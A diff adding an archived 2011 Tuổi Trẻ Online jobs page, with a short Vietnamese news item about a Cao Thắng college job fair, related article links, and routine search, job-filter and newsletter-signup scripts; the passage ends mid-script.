@@ -1,0 +1,1043 @@
+
+<HTML>
+
+	<HEAD>
+		<title>Tuổi Trẻ Online - Việc làm Online</title>
+		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
+		<LINK href="Tianyon.css" type="text/css" rel="stylesheet">
+		<script src="Tianyon.js" type="text/javascript"></script>
+		<script src="Calendar/PopCalendar.js" type="text/javascript"></script>
+		<script language="JavaScript" src="vietuni/js/vietuni.js" type="text/javascript"></script>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<link rel="shortcut icon" href="favicon.ico" />
+	</HEAD>
+	
+	<body leftmargin="0" topmargin="0" rightmargin="0">
+		<table width="789" height="99" border="0" align="center" background="Images/BgTop.jpg" cellpadding="0" cellspacing="0">
+			<tr>
+				<td width="300px"><a href="http://tuoitre.vn"><img style="border:0px" src="Images/Logo.gif"></a>					
+				</td>
+				<td>	
+					<!--<Cache Time='05/11/2011 6:07:49 CH'>--><!--</Cache>-->					
+				</td>
+			</tr>
+		</table>
+		
+		<table  width="789" height="85" align="center" bgcolor="#FFFFFF" background="Images/bg_header.gif" cellpadding="0" cellspacing="0">
+			<tr height="50">
+				<td valign="bottom" width="50%">					
+				</td>
+				<td  valign="bottom" width="50%">
+					
+<form >
+	<table height="20" cellSpacing="0" cellPadding="0" width="100%" border="0">
+		<TBODY>
+			<tr>
+				<td align="right" valign="top" class="BreakingTitle">Tìm kiếm
+				  	<INPUT id="txtKeyword" style="height:20px; background-color:#FBEFD6" type="text" size="12" name="SearchQuery" class="FlatControl" onkeypress="return trapEnterKey(this.value,event);">
+			  	</td>
+				<td align="center" width="50">
+					<INPUT type="image" src="Images/search.gif" value="1" name="image" onclick="searchEngine();">
+				</td>
+				<td align="left">
+					<select name="searchSubmit$cboInputMethod" id="searchSubmit_cboInputMethod" style="width: 55px; height: 20px; background-color:#FBEFD6; list-style-image:url(http://localhost/vieclam/template/Menu/ComboImage.gif);" onchange="setTypingMode(this.value * 1)" class="FlatControl">
+	<option selected="selected" value="0">Off</option>
+	<option value="1">Telex</option>
+	<option value="2">VNI</option>
+</select>
+				</td>
+			</tr>
+		</TBODY>
+	</table>
+</form>
+<script>
+//	setTypingMode(document.all.item("searchSubmit:cboInputMethod").selectedIndex);
+//	initTyper(document.all.item("SearchQuery"));
+//	document.SearchSubmit.SearchQuery.value = destroyURL(GetPostVariable('SearchQuery', '').replace(/\+/g, ' '));
+</script>
+<script type="text/javascript" language="javascript">
+    /* URL encode / decode */
+    var Url =
+    {
+        // public method for url encoding
+        encode: function(string) {
+            return escape(this._utf8_encode(string));
+        },
+
+        // public method for url decoding
+        decode: function(string) {
+            return this._utf8_decode(unescape(string));
+        },
+
+        // private method for UTF-8 encoding
+        _utf8_encode: function(string) {
+            string = string.replace(/\r\n/g, "\n");
+            var utftext = "";
+
+            for (var n = 0; n < string.length; n++) {
+
+                var c = string.charCodeAt(n);
+
+                if (c < 128) {
+                    utftext += String.fromCharCode(c);
+                }
+                else if ((c > 127) && (c < 2048)) {
+                    utftext += String.fromCharCode((c >> 6) | 192);
+                    utftext += String.fromCharCode((c & 63) | 128);
+                }
+                else {
+                    utftext += String.fromCharCode((c >> 12) | 224);
+                    utftext += String.fromCharCode(((c >> 6) & 63) | 128);
+                    utftext += String.fromCharCode((c & 63) | 128);
+                }
+
+            }
+
+            return utftext;
+        },
+
+        // private method for UTF-8 decoding
+        _utf8_decode: function(utftext) {
+            var string = "";
+            var i = 0;
+            var c = c1 = c2 = 0;
+
+            while (i < utftext.length) {
+
+                c = utftext.charCodeAt(i);
+
+                if (c < 128) {
+                    string += String.fromCharCode(c);
+                    i++;
+                }
+                else if ((c > 191) && (c < 224)) {
+                    c2 = utftext.charCodeAt(i + 1);
+                    string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
+                    i += 2;
+                }
+                else {
+                    c2 = utftext.charCodeAt(i + 1);
+                    c3 = utftext.charCodeAt(i + 2);
+                    string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
+                    i += 3;
+                }
+            }
+            return string;
+        }
+    }
+
+
+    function searchEngine() {
+        var url = "http://tuoitre.vn/Tim-kiem/Index.html?keyword=";
+
+        url += Url.encode(document.getElementById("txtKeyword").value) + "&scope=*&channel=-1&from=&to=&page=1";
+        window.open(url, "_blank", "", "");
+    }
+  
+</script>
+
+<script type="text/javascript" language="javascript">
+    function trapEnterKey(value, e) {
+        // the purpose of this function is to allow the enter key to
+        // point to the correct button to click.
+        var key;
+
+        if (window.event) {
+            // IE
+            key = window.event.keyCode;
+        }
+        else {
+            // firefox
+            key = e.which;
+        }
+
+        if (key == 13) {
+            var q = value;
+
+            if (q == '') {
+                return false;
+            }
+
+            if ((q.indexOf('AND') == -1) && (q.indexOf('OR') == -1) && (q.indexOf('"') == -1)) {
+                //q = '"' + q + '"';
+                q = q;
+            }
+
+            // endcode
+            q = Url.encode(q);
+
+            var urltto = "http://tuoitre.vn/Tim-kiem/Index.html?scope=*&channel=-1&from=&to=&page=1&keyword=" + q;
+            window.open(urltto, "_blank", "", "");
+
+            event.keyCode = 0;
+
+            return false;
+        }
+
+        return true;
+    }                         
+</script>
+				</td>
+			</tr>
+			<tr>
+				<td colspan="2" valign="top">					
+					
+
+<table cellSpacing="0" cellPadding="0" align="center" width="760" border="0">
+	<tr height="0">
+		<td>			
+		</td>
+	</tr>
+</table>
+<table cellSpacing="0" cellPadding="0" align="center" width="740" border="0"> 
+	<tr valign="top">				                
+	    <td height="21" align="center">
+			<span class="MenuHeader" style="margin-top:0px">Một chuyên trang của Tuổi Trẻ Online</span>
+		</td>
+		<td height="21" align="center">
+			<a class="MenuTitle" href="http://tuoitre.vn/" style="margin-top:0px">
+				TUỔI TRẺ Online
+			</a>
+		</td>
+		<td height="21" >
+			<img src="template/Menu/Space.gif" />
+		</td>	
+		<td height="21" align="center">
+			<a class="MenuItem" href="http://vieclam.tuoitre.vn" style="margin-top:0px">
+				Trang nhất
+			</a>
+		</td>
+		
+		<td height="21">
+			<img src="template/Menu/Space.gif" />
+		</td>							
+		<td height="15" align="center">
+			<a class='MenuItem' href='http://chuyentrang.tuoitre.vn/Vieclam/Index.aspx?ChannelID=271'>					
+				Tư vấn
+			</a>
+		</td>			
+
+		<td height="21">
+			<img src="template/Menu/Space.gif" />
+		</td>							
+		<td height="15" align="center" >
+			<a class='MenuItem' href='http://chuyentrang.tuoitre.vn/Vieclam/Index.aspx?ChannelID=272'>					
+				Kinh nghiệm
+			</a>
+		</td>			
+
+		<td height="21">
+			<img src="template/Menu/Space.gif" />
+		</td>							
+		<td height="15" align="center" >
+			<a class='MenuItem' href='http://chuyentrang.tuoitre.vn/Vieclam/Index.aspx?ChannelID=269'>					
+				Thời sự
+			</a>
+		</td>			
+
+		<td height="21">
+			<img src="template/Menu/Space.gif" />
+		</td>							
+		<td height="15" align="center" >
+			<a class='MenuItem' href='http://chuyentrang.tuoitre.vn/Vieclam/Index.aspx?ChannelID=697'>					
+				Hướng nghiệp
+			</a>
+		</td>			
+
+		<td height="21">
+			<img src="template/Menu/Space.gif" />
+		</td>							
+		<td height="15" align="center" >
+			<a class='MenuItem' href='http://chuyentrang.tuoitre.vn/Vieclam/Index.aspx?ChannelID=275'>					
+				Cuộc thi
+			</a>
+		</td>
+	</tr>	
+</table>
+				</td>
+			</tr>
+		</table>
+			
+		<table width="789" border="0" cellpadding="0" cellspacing="0" align="center"  bgcolor="#EEB94A">			
+			<tr height="0">
+				<td colspan="6"></td>
+			</tr>
+			<tr>
+				<td align="left" style="display:none">
+					
+				</td>
+				<td nowrap width="13"></td>
+				<td nowrap width="576" align="center" vAlign="top">					
+					
+<script>
+ function onResponseClick()
+ {
+	showDialog('MailTo.aspx?ArticleID=' + GetPostVariable("ArticleID", null), 350, 420)
+ }
+</script>
+<table cellSpacing="0" cellPadding="0" width="100%" border="0" background="images/khaki.gif">
+	<tr height=25>
+		<td vAlign="middle" width="100%" bgColor="#000066">&nbsp;&nbsp;<A class=ChannelListTitle href="Index.aspx?ChannelID=269">Việc làm Online</A></td>
+	</tr>
+	<tr>
+		<td vAlign="top" width="100%" align="center">
+			<table cellSpacing="0" cellPadding="0" width="95%" border="0">
+				<tr>
+					<td width="100%"><div id="divContent"><script>getTimeString('2011/11/05 06:15:00');</script><br><P class=pTitle>Ngày hội việc làm cho sinh viên ngành kỹ thuật</P>
+<P class=pHead>TT - Sáng 4-11, gần 10.000 học sinh, sinh viên trên địa bàn TP.HCM đến tham dự “Ngày hội việc làm học sinh, sinh viên Cao Thắng năm 2011” tổ chức tại Trường CĐ Kỹ thuật Cao Thắng. </P>
+<P class=pBody>20 doanh nghiệp Việt Nam tham gia như: Unilever Việt Nam, Intel Việt Nam, P&amp;G, Xi măng Holcim Việt Nam, Nguyễn Kim... tham gia ngày hội đã rao tuyển trực tiếp trên 1.500 chỗ làm thuộc lĩnh vực kỹ thuật.</P>
+<P class=pBody>
+<TABLE style="BORDER-COLLAPSE: separate" class=tLegend border=0 cellSpacing=2 cellPadding=0 width=40 align=center>
+<TBODY>
+<TR>
+<TD><IMG class=lImage onclick="return showImage(this.src)" border=1 hspace=0 src="ImageView.aspx?ThumbnailID=529646" Hyperlink></TD></TR>
+<TR>
+<TD>
+<P class=tLegend>Sinh viên Trường CĐ Kỹ thuật Cao Thắng tìm hiểu cơ hội việc làm tại Công ty Intel VN - Ảnh: Trường Giang</P></TD></TR></TBODY></TABLE></P>
+<P class=pBody>Tại ngày hội, các chuyên gia tuyển dụng của các doanh nghiệp tổ chức nhiều hoạt động dành cho học sinh, sinh viên xác định mục tiêu nghề nghiệp của mình như: phỏng vấn trực tiếp ứng viên, kiểm tra năng lực nghề nghiệp, tìm hiểu quy trình hoạt động doanh nghiệp...</P>
+<P class=pAuthor>TRƯỜNG GIANG</P></div>
+
+						<p align="center">
+						<A href="JavaScript:location.href='PrintView.aspx'+location.search">
+							<IMG src="images/print.gif" border="0">
+						</A>&nbsp;&nbsp;&nbsp;
+						<A href="?RefID=463599&amp;ContactID=">
+							<IMG src="images/response.gif" border="0">
+						</A>&nbsp;&nbsp;&nbsp;
+						<A href="JavaScript:onResponseClick();">
+							<IMG src="images/email.gif" border="0">
+						</A>&nbsp;&nbsp;&nbsp;
+						<A href="#top">
+							<IMG src="images/top.gif" border="0"></A>
+						</p>
+	  </td>
+  </tr>
+  
+				<tr height="10">
+					<td></td>
+				</tr>
+				<tr height="1">
+					<td  style="background-image:url(images/Article.gif); background-repeat:repeat-x; margin-top:10"></td>
+				</tr>
+				<tr height="10">
+					<td></td>
+				</tr>
+				
+				
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=463598&ChannelID=269' title='TT - Sáng 4-11, Trường Nghiệp vụ nhà hàng thành phố (thuộc Sở LĐ-TB&amp;XH TP.HCM) đã khánh thành dự án “Củng cố và phát triển trường nghiệp vụ nhà hàng TP” (giai đoạn 2009-2011).'>
+									Đào tạo nghề cho bạn trẻ gặp khó - (05/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=462061&ChannelID=269' title='TTO - * Em vừa tốt nghiệp ĐH chuyên ngành quản trị kinh doanh tổng hợp (loại khá) và đang&nbsp;tìm việc. Mục tiêu của em là tìm được một công việc có nhiều cơ hội học hỏi và khả năng thăng tiến cao.'>
+									Học quản trị kinh doanh làm được công việc nào? - (04/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=463551&ChannelID=269' title='TTO - Sáng 4-11, tại Trường CĐ Kỹ thuật Cao Thắng (65 Huỳnh Thúc Kháng, Q1, TP.HCM) hơn 10.000 sinh viên tham gia “Ngày hội việc làm học sinh, sinh viên Cao Thắng 2011”.'>
+									Hơn 1.500 việc làm dành cho sinh viên - (04/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=463397&ChannelID=269' title='TTO - * Em là sinh viên năm cuối Trường ĐH Tôn Đức Thắng chuyên ngành kế toán - kiểm toán. Khi&nbsp;học năm 3 thì em nhận thấy mình không phù hợp theo ngành này và em đang có ý định theo đuổi ngành PR và marketing.'>
+									Học kế toán nhưng mê làm PR? - (03/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=463288&ChannelID=269' title='TT - Đây là chỉ tiêu đưa ra trong “Chương trình việc làm tết 2012” do Trung tâm Hỗ trợ SV TP.HCM (SAC) triển khai từ ngày 10-11-2011 đến 10-2-2012, hỗ trợ việc làm thêm cho sinh viên trong dịp Tết Nhâm Thìn 2012, với sự góp mặt của khoảng 350 đơn vị, doanh nghiệp tuyển dụng tại TP.HCM.'>
+									3.500 việc làm tết cho sinh viên - (03/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=463077&ChannelID=269' title='TTO - Không chỉ người quản lý mới có tầm ảnh hưởng lên người khác, mà những nhân viên bình thường cũng có thể trở thành tấm gương&nbsp;được kính&nbsp;trọng trong công ty&nbsp;nếu biết cách xây dựng tầm ảnh hưởng.'>
+									"Bí quyết" tạo tầm ảnh hưởng - (02/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=463143&ChannelID=269' title='Chiều 1-11, Bộ Công Thương cho biết nhân chuyến thăm chính thức Nhật Bản, Thủ tướng&nbsp;Nguyễn Tấn Dũng và Thủ tướng Nhật Bản Yoshihiko Noda đã ký thỏa thuận đưa&nbsp;điều dưỡng viên và hộ lý&nbsp;của Việt Nam sang Nhật làm việc.'>
+									VN "xuất khẩu"&nbsp;điều dưỡng viên, hộ lý sang Nhật - (01/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=461929&ChannelID=269' title='TTO - * Tôi tốt nghiệp cao đẳng chuyên ngành quản trị kinh doanh tổng hợp loại khá. Tôi sống tự lập từ nhỏ, rất có ý thức và tự tin.&nbsp;Tính tôi hướng ngoại, sôi nổi nhưng cũng rất điềm đạm.'>
+									Khó tìm việc vì quá tự tin? - (01/11)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=462840&ChannelID=269' title='TT - Chân thành là điều quan trọng khi dự tuyển trong một cuộc phỏng vấn xin việc. Điều này được các chuyên viên nhân sự tham dự buổi trao đổi chuyên đề “Vượt qua buổi phỏng vấn” khẳng định sáng 30-10 tại tòa soạn báo Tuổi Trẻ.'>
+									Nhà tuyển dụng thích lời nói thật - (31/10)
+								</a>
+							</td>
+						</tr>
+					
+						<tr>
+							<td height="16">
+								&nbsp;&nbsp;&nbsp;<img src="images/SmallDot.gif">&nbsp;
+								<a class="ArticleItem" href='Index.aspx?ArticleID=462692&ChannelID=269' title='TTO - Bạn phải đối mặt với những thách thức nào khi làm trái ngành?&nbsp;Người làm trái ngành có nhiều cơ hội thành công&nbsp;không? Đó là những vấn đề "nóng" được các doanh nhân, nghệ sĩ chia sẻ với hơn 1.000 sinh viên trong&nbsp;hội thảo “Sinh viên và những câu chuyện trái ngành”,&nbsp;diễn ra tại ĐH Kinh tế TP.HCM vào sáng nay 29-10.'>
+									Làm việc trái ngành có cơ hội thành công? - (29/10)
+								</a>
+							</td>
+						</tr>
+					
+				
+				<tr height="15">
+					<td></td>
+				</tr>
+			</table>
+	</tr>
+</table>
+
+				</td>
+				<td nowrap width="10"></td>
+				<td nowrap vAlign="top" align="center" width="180" height="100%" bgcolor="#FFFFFF">
+						<table cellpadding="0" cellspacing="0" border="0" width="100%" height="100" >
+							<tr>
+								<td height="10">
+								</td>
+							</tr>
+							<tr>
+								<td align="center">
+									
+
+<style type="text/css">
+<!--
+/*---------------------------- CSS QUICK SEARCH JOBS ------------------------*/
+table {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 12px;
+	color: #000000;	line-height: 1.4;
+}
+.textnote {
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 10px;
+	color: #666666;
+}
+.border {
+	background-color: #edb94b;
+	width: 160px;
+}
+.title_quicksearch{
+	background-repeat: no-repeat;
+	background-position: left center;
+	height: 26px;
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 12px;
+	font-weight: bold;
+	text-transform: uppercase;
+	color: #333333;
+	text-decoration: none;
+	padding-left: 16px;
+	padding-top: 3px;
+	background-image: url(images/icon_title.gif);
+	border-bottom-width: 1px;
+	border-bottom-style: inset;
+	border-bottom-color: #FF6500;
+}
+.bg_quicksearch{
+	background-color: #FFFFFF;
+	margin: 0px;
+	background-repeat: repeat-y;
+	background-position: left center;
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 12px;
+	font-weight: normal;
+	text-transform: capitalize;
+	color: #474747;
+	text-decoration: none;
+	background-image: url(images/img_02.gif);
+	width: 160px;
+}
+/* --------------------------------- CSS BG RIGHT MENU ---------------------------------------*/
+.bg_rightmenu {
+	background-color: #F8F0E5;
+	border: 1px solid #E59001;
+	padding: 3px;
+	text-align: center;
+	width: 160px;
+}
+.rightmenu_act {
+	color: #ce4c00;
+	text-decoration: none;
+	font-family: Tahoma;
+	font-size: 11px;
+	font-weight: bold;
+	text-transform: capitalize;
+	height: 28px;
+	padding-top: 3px;
+}
+.rightmenu {
+	color: #ce4c00;
+	text-decoration: none;
+	font-family: Tahoma;
+	font-size: 11px;
+	text-transform: capitalize;
+	height: 28px;
+	padding-top: 3px;
+	background-image: url(images/dotline.gif);
+	background-repeat: repeat-x;
+	background-position: left bottom;
+}
+.rightmenu a:link {
+	color: #ce4c00;
+	text-decoration: none;
+	font-family: Tahoma;
+	font-size: 11px;
+	text-transform: capitalize;
+}
+.rightmenu a:visited {
+	color: #ce4c00;
+	text-decoration: none;
+	font-family: Tahoma;
+	font-size: 11px;
+	text-transform: capitalize;
+}
+.rightmenu a:hover {
+	color: #9D3C00;
+	text-decoration: none;
+	font-family: Tahoma;
+	font-size: 11px;
+	text-transform: capitalize;
+}
+.rightmenu a:active {
+	color: #ce4c00;
+	text-decoration: none;
+	font-family: Tahoma;
+	font-size: 11px;
+	text-transform: capitalize;
+}
+-->
+</style>
+
+</head>
+<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<form name="qsFrm" method="post" onSubmit="submitSearch();return false;">
+          		<input type=hidden name='searchby' value=0>
+<table width="160"  border="0" cellpadding="0" cellspacing="0">
+  <tr>
+    <td height="10" align="left" valign="top"><table width="100%"  border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td align="left" valign="top"><img src="Images/img_01.gif" alt="" width="160"></td>
+      </tr>
+      <tr>
+        <td align="left" valign="top" class="bg_quicksearch"><table width="85%"  border="0" align="center" cellpadding="0" cellspacing="0">
+          <tr> </tr>
+          <tr>
+            <td height="5" >Ng&agrave;nh:</td>
+          </tr>
+          <tr>
+            <td height="5" ></td>
+          </tr>
+          <tr>
+            <td height="5" ><select name="industry" class="input" style="width:150px">
+	<option value="0" selected="selected">- Chọn tất cả -</option>
+	<option value="1">IT</option>
+	<option value="2">Kế toán</option>
+	<option value="3">Hành chánh/Thư ký</option>
+	<option value="4">Quảng cáo/Tiếp thị/Đối ngoại</option>
+	<option value="5">Nông nghiệp/Thực phẩm</option>
+	<option value="6">Kiến trúc</option>
+	<option value="7">Dược phẩm/Sinh học</option>
+	<option value="8">Xây dựng</option>
+	<option value="9">Tư vấn</option>
+	<option value="10">Hàng tiêu dùng</option>
+	<option value="11">Dịch vụ sáng tạo</option>
+	<option value="12">Dịch vụ khách hàng</option>
+	<option value="13">Giáo dục/Đào tạo/Thư viện</option>
+	<option value="14">Cơ khí/Kỹ thuật ứng dụng</option>
+	<option value="15">Giải trí</option>
+	<option value="16">Môi trường/Xử lý chất thải</option>
+	<option value="17">Điều hành</option>
+	<option value="18">Xuất nhập khẩu</option>
+	<option value="19">Tài chính/Ngân hàng</option>
+	<option value="20">Chính phủ/Phi lợi nhuận</option>
+	<option value="21">Y tế</option>
+	<option value="22">Nhân sự</option>
+	<option value="23">Bảo hiểm</option>
+	<option value="24">Pháp lý</option>
+	<option value="25">Sản xuất/Vận hành sản xuất</option>
+	<option value="26">Dầu khí</option>
+	<option value="27">Khác</option>
+	<option value="28">Bất động sản</option>
+	<option value="29">Nhà hàng/Khách sạn</option>
+	<option value="30">Bán sỉ/Bán lẻ</option>
+	<option value="31">Kinh doanh</option>
+	<option value="32">Bưu chính viễn thông</option>
+	<option value="33">Vận chuyển/Kho bãi</option>
+	<option value="34">Du lịch/Nhà nghỉ</option>
+	<option value="35">Tiện ích</option>
+	<option value="36">Thống kê</option>
+	<option value="37">Báo chí/Biên tập viên</option>
+	<option value="38">Biên phiên dịch</option>
+	<option value="39">Dệt may</option>
+	<option value="41">Hóa chất/Sinh hóa</option>
+	<option value="42">Quản lý chất lượng</option>
+	<option value="43">Vật tư/Theo dõi đơn hàng</option>
+	<option value="44">Lao động phổ thông</option>
+	<option value="45">Mới tốt nghiệp/Thực tập</option>
+</select></td>
+          </tr>
+          <tr>
+            <td height="5" ></td>
+          </tr>
+          <tr>
+            <td height="5" >T&#7881;nh/Th&agrave;nh Ph&#7889;:</td>
+          </tr>
+          <tr>
+            <td height="5" ></td>
+          </tr>
+          <tr>
+            <td height="5" ><select name="locations" class="input" style="width:150px" >
+	<option value="0" selected="selected">- Chọn tất cả -</option>
+	<option value="8">HCM</option>
+	<option value="4">Ha Noi</option>
+	<option value="76">An Giang</option>
+	<option value="64">Ba Ria-VT</option>
+	<option value="281">Bac Can</option>
+	<option value="240">Bac Giang</option>
+	<option value="781">Bac Lieu</option>
+	<option value="241">Bac Ninh</option>
+	<option value="75">Ben Tre</option>
+	<option value="56">Binh Dinh</option>
+	<option value="650">Binh Duong</option>
+	<option value="651">Binh Phuoc</option>
+	<option value="62">Binh Thuan</option>
+	<option value="78">Ca Mau</option>
+	<option value="71">Can Tho</option>
+	<option value="26">Cao Bang</option>
+	<option value="511">Da Nang</option>
+	<option value="50">Dac Lac</option>
+	<option value="900">Dien Bien</option>
+	<option value="61">Dong Nai</option>
+	<option value="67">Dong Thap</option>
+	<option value="59">Gia Lai</option>
+	<option value="19">Ha Giang</option>
+	<option value="351">Ha Nam</option>
+	<option value="34">Ha Tay</option>
+	<option value="39">Ha Tinh</option>
+	<option value="320">Hai Duong</option>
+	<option value="31">Hai Phong</option>
+	<option value="18">Hoa Binh</option>
+	<option value="321">Hung Yen</option>
+	<option value="58">Khanh Hoa</option>
+	<option value="77">Kien Giang</option>
+	<option value="60">Kon Tum</option>
+	<option value="23">Lai Chau</option>
+	<option value="63">Lam Dong</option>
+	<option value="25">Lang Son</option>
+	<option value="20">Lao Cai</option>
+	<option value="72">Long An</option>
+	<option value="350">Nam Dinh</option>
+
+	<option value="38">Nghe An</option>
+	<option value="30">Ninh Binh</option>
+	<option value="68">Ninh Thuan</option>
+	<option value="901">Khác</option>
+	<option value="210">Phu Tho</option>
+	<option value="57">Phu Yen</option>
+	<option value="52">Quang Binh</option>
+	<option value="510">Quang Nam</option>
+	<option value="55">Quang Ngai</option>
+	<option value="33">Quang Ninh</option>
+	<option value="53">Quang Tri</option>
+	<option value="79">Soc Trang</option>
+	<option value="22">Son La</option>
+	<option value="54">T. Thien Hue</option>
+	<option value="66">Tay Ninh</option>
+	<option value="36">Thai Binh</option>
+	<option value="280">Thai Nguyen</option>
+	<option value="37">Thanh Hoa</option>
+	<option value="73">Tien Giang</option>
+	<option value="74">Tra Vinh</option>
+	<option value="27">Tuyen Quang</option>
+	<option value="70">Vinh Long</option>
+	<option value="211">Vinh Phuc</option>
+	<option value="29">Yen Bai</option>
+</select></td>
+          </tr>
+		   <input type="hidden" name="view" value="1"><input type="hidden" name="sort" value="1"> 
+          <tr>
+            <td height="10"></td>
+          </tr>
+          <tr>
+            <td class="textnote"><div align="center">
+			
+          	<input type="image" src="Images/Quicksearch_05.gif" width="75" height="19" border="0"  onClick="submitSearch();return false;">
+</div></td>
+		  </tr>
+        </table></td>
+      </tr>
+	  </form>
+      <tr>
+        <td align="left" valign="top"><img src="Images/img_03.gif" alt="" width="160"></td>
+      </tr>
+    </table></td>
+	
+  </tr>
+  <tr>
+    <td height="10" align="left" valign="top"></td>
+  </tr>
+    <form name="editFrm" action="" method="post">
+	 <input type="hidden" name="act">
+  <tr>
+    <td width="160" height="10" align="left" valign="top"><table width="160"  border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td width="160" align="left" valign="top"><table width="160"  border="0" align="center" cellpadding="0" cellspacing="0">
+            <tr>
+              <td height="25" align="center" class="border"><strong>Nhận Bản Tin Việc Làm </strong></td>
+            </tr>
+            <tr>
+              <td height="10" align="center" class="bg_rightmenu"><table width="100%" height="19%"  border="0" align="center" cellpadding="0" cellspacing="2">
+                  <tr>
+                    <td height="3" ></td>
+                  </tr>
+                  <tr>
+                    <td align="center" class="textnote"><input name="email"  style="width:150px" id="email" onKeyPress="submitenter()"   type="text" value="Nhập Email của Bạn" size="30"></td>
+                  </tr>
+                  <tr>
+                    <td height="3" ></td>
+                  </tr>
+                  <tr>
+                    <td align="center"><div align="center">										
+					<input type="image"  onClick="submitemail()" src="Images/signup.gif" border="0" style="cursor:hand">
+</div></td>
+                  </tr>
+                  <tr>
+                    <td height="3"></td>
+                  </tr>
+                  <tr>
+                    <td height="22" valign="top" class="text_note" ><div align="justify"><a href="#"></a>Đăng ký để nhận   bản tin về những cơ hội việc làm mới nhất.</div></td>
+                  </tr>
+              </table></td>
+            </tr>
+        </table></td>
+      </tr>
+	  </form>
+    </table></td>
+  </tr>
+</table>
+<script>
+function submitSearch(){
+	//alert(11);
+    var form = document.qsFrm;
+	//var kw;
+	///kw = replace(form.keyword.value,'"','%22');
+	//kw = replace(kw,"'","%27");
+
+	//kw = replace(kw,"&","%26");
+	//alert(kw);
+	//form.btsearch.disabled=true;
+	//form.style.cursor='wait';+ "&country=" + CSelected() 
+	window.location="http://vieclam.tuoitre.com.vn/jobseeker/index.php?m=jobsearch&a=result&l=1&sort=" + form.sort.value + "&view=" + VChecked() + "&loc=" + LSelected() + "&ind=" + ISelected();
+	//form.action="http://tuoitre.timnhanh.com/jobseeker/index.php?m=jobsearch&a=result&l=1&sort=" + form.sort.value + "&view=" + VChecked() + "&loc=" + LSelected() + "&ind=" + ISelected();
+	//alert('1a');
+	//return false;
+	//form.submit();
+}
+function LSelected(){
+	var form = document.qsFrm;
+	var i = form.locations.length -1;
+	var ls;
+	ls = "";
+	for (i; i > -1; i--) {
+		if (form.locations.options[i].selected)
+			ls = ls + "," + form.locations.options[i].value
+	}
+	return ls.substr(1, ls.length);
+}
+function ISelected(){
+	var form = document.qsFrm;
+	/*var i = form.industry.length -1;
+	var ls;
+	ls = "";
+	for (i; i > -1; i--) {
+		if (form.industry.options[i].selected)
+			ls = ls + "," + form.industry.options[i].value
+	}*/
+	//return ls.substr(1, ls.length);
+	return form.industry.value;
+}
+function SChecked(){
+	var form = document.qsFrm;
+	/*if (form.sort[0].checked) {
+		return form.sort[0].value;
+	}
+	if (form.sort[1].checked) {
+		return form.sort[1].value;
+	}*/
+	return form.sort.value;
+}
+function VChecked(){
+	var form = document.qsFrm;
+	/*if (form.view[0].checked) {
+		return form.view[0].value;
+	}
+	if (form.view[1].checked) {
+		return form.view[1].value;
+	}*/
+	return form.view.value;
+}
+/////////////////////
+
+</script>
+  <script>
+function checkNormalChar(stringIn) {
+	 retval = false 
+	 var i;
+     for (i=0;i<=stringIn.length-1;i++) { 
+     	 //cho phep nhung ky tu tu A->Z, a->z, 0->9,va cac ky tu @,_
+	      if (((stringIn.charCodeAt(i) >= 48)&&(stringIn.charCodeAt(i) <= 57)) || ((stringIn.charCodeAt(i) >= 64)&&(stringIn.charCodeAt(i) <= 90)) || ((stringIn.charCodeAt(i) >= 97)&&(stringIn.charCodeAt(i) <= 122)) ||(stringIn.charCodeAt(i)==95) ||(stringIn.charCodeAt(i)==46) ||(stringIn.charCodeAt(i)==45)) { 
+                retval = true;
+      	  }else{
+      	  		retval = false;
+      	  		break;
+         }
+     }
+	 return retval;
+}
+
+function checkEmail(stringIn) {
+	if (stringIn.indexOf("@") < 1){
+		return false;
+	}else{
+		st = stringIn.substr(stringIn.indexOf("@"));
+		if(st.indexOf(".") == -1){
+			return false;
+		}else{
+			if(!checkNormalChar(stringIn)){
+				return false;
+			}else{
+				return true;
+			}
+		}
+	}
+}
+function submitemail(){
+    var form = document.editFrm;	
+	if((form.email.value.length < 5)||!checkEmail(form.email.value))
+	{	alert ("Vui lòng nhập email!");
+		form.email.focus();
+		return false;
+	}
+	else
+	{	
+		form.act.value='subemail';
